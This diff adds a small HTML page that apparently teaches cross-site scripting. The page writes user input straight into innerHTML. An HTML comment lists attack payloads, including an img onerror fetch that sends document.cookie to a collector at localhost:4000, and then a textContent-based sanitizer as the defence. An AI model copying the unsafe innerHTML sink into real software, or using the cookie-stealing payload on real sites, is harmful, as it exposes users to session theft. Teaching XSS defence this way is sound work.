@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <input id="input" type="text" />
+    <button onclick="container.innerHTML = input.value">点击</button>
+    <p id="container"></p>
+
+  </body>
+</html>
+
+<!-- 
+  攻击代码：
+  <script>alert('1')</script>"
+  <img src="x" onerror="alert(1)">
+  <img src="x" onerror="fetch(`http://localhost:4000/cookies?cookie=${document.cookie}`)">
+
+  防御代码：
+  <button onclick="container.innerHTML = sanitizeHTML(input.value)">点击</button>
+  <script>
+    function sanitizeHTML(str) {
+      var div = document.createElement('div')
+      div.textContent = str
+      return div.innerHTML
+    }
+  </script>
+ -->
+
+ 
